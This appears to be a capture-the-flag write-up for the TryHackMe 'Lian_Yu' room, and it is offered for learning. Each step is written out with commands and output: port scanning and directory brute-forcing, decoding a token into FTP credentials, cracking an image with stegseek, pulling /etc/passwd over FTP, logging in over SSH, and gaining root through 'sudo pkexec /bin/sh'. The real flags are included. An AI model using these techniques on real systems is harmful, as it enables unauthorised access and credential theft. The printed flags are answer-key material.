| Category          | Details                                                      |
|-------------------|--------------------------------------------------------------|
| 📝 **Name**       | [Lian_Yu](https://tryhackme.com/room/lianyu)                 |  
| 🏷 **Type**       | THM Challenge                                                |
| 🖥 **OS**         | Linux                                                        |
| 🎯 **Difficulty** | Easy                                                         |
| 📁 **Tags**       | web enumeration, ftp enumeration, steganography, sudo pkexec |

##  Task 1: Find the Flags

### What is the Web Directory you found?

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Lian_Yu]
└─$ nmap -sS -sC -sV $TARGET    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-12 18:26 +0100
Nmap scan report for 10.82.184.145
Host is up (0.066s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35105/udp6  status
|   100024  1          46054/udp   status
|   100024  1          55682/tcp   status
|_  100024  1          57185/tcp6  status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.06 seconds
```

#### Enumerate web server
```
┌──(magicrc㉿perun)-[~/attack/THM Lian_Yu]
└─$ feroxbuster --url http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
<SNIP>
301      GET        7l       20w      235c http://10.82.184.145/island => http://10.82.184.145/island/
301      GET        7l       20w      240c http://10.82.184.145/island/2100 => http://10.82.184.145/island/2100/
<SNIP>
```
We can see that `feroxbuster` has found `/island` and `/island/2100` web directories.

### What is the file name you found?

#### Access `/island`
```
┌──(magicrc㉿perun)-[~/attack/THM Lian_Yu]
└─$ curl http://$TARGET/island/                       
<SNIP>
<h1> Ohhh Noo, Don't Talk............... </h1>
<SNIP>
<p> I wasn't Expecting You at this Moment. I will meet you there </p><!-- go!go!go! -->
<SNIP>
<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>
<SNIP>
```
Inserting part of this HTML is `vigilante` 'hidden' with white color.

#### Access `/island/2100` URL
```
┌──(magicrc㉿perun)-[~/attack/THM Lian_Yu]
└─$ curl http://$TARGET/island/2100/
<!DOCTYPE html>
<html>
<body>

<h1 align=center>How Oliver Queen finds his way to Lian_Yu?</h1>


<p align=center >
<iframe width="640" height="480" src="https://www.youtube.com/embed/X8ZiFuW41yY">
</iframe> <p>
<!-- you can avail your .ticket here but how?   -->

</header>
</body>
</html>
```
Comment in HTML mentions `.ticket`, thus we could try to lookup files with such extension. 

#### Lookup `.ticket` files in `/island/2100/` 
```
┌──(magicrc㉿perun)-[~/attack/THM Lian_Yu]
└─$ feroxbuster --url http://$TARGET/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x ticket
<SNIP>
200      GET        6l       11w       71c http://10.82.184.145/island/2100/green_arrow.ticket
<SNIP>
```
We have discovered `green_arrow.ticket` file

### What is the FTP Password?

#### Access `/island/2100/green_arrow.ticket`
```
┌──(magicrc㉿perun)-[~/attack/THM Lian_Yu]
└─$ curl http://$TARGET/island/2100/green_arrow.ticket

This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX
```
`green_arrow.ticket` contains text that might be password, but as we are not able to use to connect to target neither over FTP nor SSH, we need to dig deeper.

#### Try to decode using baseN
```
┌──(magicrc㉿perun)-[~/attack/THM Lian_Yu]
└─$ ~/Tools/crypto/decode_base.sh RTy8yhBQdscX
Base32 : [invalid]
Base58 : !#th3h00d
Base64 : 453cbcca105076c717
```
Decoding with `base58` yields interesting result, we could try using `!#th3h00d` as password for `vigilante` user.

#### Connect to target over FTP using `vigilante:!#th3h00d` credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Lian_Yu]
└─$ ftp vigilante@$TARGET            
Connected to 10.82.184.145.
220 (vsFTPd 3.0.2)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

### What is the file name with SSH password?

#### Enumerate FTP server
```
┌──(magicrc㉿perun)-[~/attack/THM Lian_Yu]
└─$ ftp vigilante@$TARGET                                                                                                              
Connected to 10.82.184.145.
220 (vsFTPd 3.0.2)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /home/vigilante
ftp> ls
229 Entering Extended Passive Mode (|||30124|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
ftp> ls /
229 Entering Extended Passive Mode (|||57015|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 01  2020 bin
drwxr-xr-x    3 0        0            4096 Apr 30  2020 boot
drwxr-xr-x   16 0        0            2840 Jan 13 03:01 dev
drwxr-xr-x   90 0        0            4096 Jan 13 03:01 etc
drwxr-xr-x    4 0        0            4096 May 01  2020 home
lrwxrwxrwx    1 0        0              31 Apr 30  2020 initrd.img -> /boot/initrd.img-3.16.0-4-amd64
drwxr-xr-x   15 0        0            4096 Apr 30  2020 lib
drwxr-xr-x    2 0        0            4096 Apr 30  2020 lib64
drwxr-xr-x    2 0        0            4096 Apr 25  2015 live-build
drwx------    2 0        0           16384 Apr 30  2020 lost+found
drwxr-xr-x    3 0        0            4096 Apr 25  2015 media
drwxr-xr-x    2 0        0            4096 Apr 25  2015 mnt
drwxr-xr-x    2 0        0            4096 May 01  2020 opt
dr-xr-xr-x   79 0        0               0 Jan 13 03:01 proc
drwx------    3 0        0            4096 May 01  2020 root
drwxr-xr-x   20 0        0             700 Jan 13 03:01 run
drwxr-xr-x    2 0        0            4096 May 01  2020 sbin
drwxr-xr-x    3 0        0            4096 May 01  2020 srv
dr-xr-xr-x   13 0        0               0 Jan 13 03:01 sys
drwxrwxrwt    7 0        0            4096 Jan 13 03:01 tmp
drwxr-xr-x   10 0        0            4096 Apr 30  2020 usr
drwxr-xr-x   12 0        0            4096 Apr 30  2020 var
lrwxrwxrwx    1 0        0              27 Apr 30  2020 vmlinuz -> boot/vmlinuz-3.16.0-4-amd64
226 Directory send OK.
```
With `ls /` we can see that FTP is chrooted to `/`, which means that we could browse files on the target within permissions. For now let's analyze images in home directory.

#### Look for embedded data in `aa.jpg`
```
┌──(magicrc㉿perun)-[~/attack/THM Lian_Yu]
└─$ stegseek -wl /usr/share/wordlists/rockyou.txt aa.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "password"
[i] Original filename: "ss.zip".
[i] Extracting to "aa.jpg.out".
```

#### Extract discovered .zip archive
```
┌──(magicrc㉿perun)-[~/attack/THM Lian_Yu]
└─$ unzip aa.jpg.out 
Archive:  aa.jpg.out
  inflating: passwd.txt              
  inflating: shado                   
```

#### Read extracted files
```
┌──(magicrc㉿perun)-[~/attack/THM Lian_Yu]
└─$ cat shado                  
M3tahuman
                                             
┌──(magicrc㉿perun)-[~/attack/THM Lian_Yu]
└─$ cat passwd.txt         
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
```
`shado` seems to hold some password, now we need to find users. We could try to exfiltrate `/etc/passwd` with FTP.

#### Exfiltrate `/etc/passwd` over FTP
```
ftp> cd /etc
250 Directory successfully changed.
ftp> get passwd
local: passwd remote: passwd
229 Entering Extended Passive Mode (|||26211|).
150 Opening BINARY mode data connection for passwd (1657 bytes).
100% |*******************************************************************************************************************************************************|  1657        3.64 MiB/s    00:00 ETA
226 Transfer complete.
1657 bytes received in 00:00 (39.05 KiB/s)
```

#### Discover `slade` user
```
┌──(magicrc㉿perun)-[~/attack/THM Lian_Yu]
└─$ cat passwd    
<SNIP>
slade:x:1000:1000:slade,,,:/home/slade:/bin/bash
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:110:118:ftp daemon,,,:/srv/ftp:/bin/false
vigilante:x:1001:1001:,,,:/home/vigilante:/bin/bash
```

#### Access target over SSH using `slade:M3tahuman` credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Lian_Yu]
└─$ ssh slade@$TARGET
slade@LianYu:~$ id
uid=1000(slade) gid=1000(slade) groups=1000(slade),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth)
```

### user.txt

#### Captrue user flag
```
slade@LianYu:~$ grep THM /home/slade/user.txt 
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```

### root.txt

#### List allowed sudo commands
```
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

#### Escalate to `root` user using `sudo pkexec`
```
slade@LianYu:~$ sudo pkexec /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Capture root flag
```
# grep THM /root/root.txt
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```
